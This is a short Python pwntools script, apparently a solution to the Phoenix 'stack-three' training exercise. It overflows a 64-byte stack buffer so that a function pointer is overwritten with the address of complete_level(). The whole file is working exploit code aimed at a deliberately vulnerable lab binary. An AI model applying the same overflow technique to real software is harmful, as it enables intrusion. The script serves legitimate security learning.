
# Stack buffer function pointer corruption
# This exercise has a function (void complete_level()) that needs to be called by stack corruption of
# a function pointer (*fp)(). Thus, the NULL function pointer calls something else.

# Unlike the other times where args could be passed easily, this one requires debugging and getting
# an address to put into the volatile int space.
import pwn

filepath = "/opt/phoenix/amd64/stack-three"
elffile = pwn.ELF(filepath)

payload_address = elffile.sym['complete_level']
pwn.log.info('complete_level function @ ' + str(payload_address))

# Turn int to hex without 0x, and then into our chars
payload = bytes.fromhex(format(payload_address,'x'))
pwn.log.info('Payload prepared: ' + str(payload))

# drop into a process
proc = elffile.process()

# Receive banner
output = proc.recvline()
pwn.log.info(output.decode('utf-8'))

pwn.log.info('Sending A*64')
proc.send('A'*64)

pwn.log.info('Sending payload for complete_level')
proc.sendline(payload[::-1])

output = proc.recvline()
pwn.log.info(output.decode('utf-8'))

output = proc.recvline()
pwn.log.info(output.decode('utf-8'))

exit()
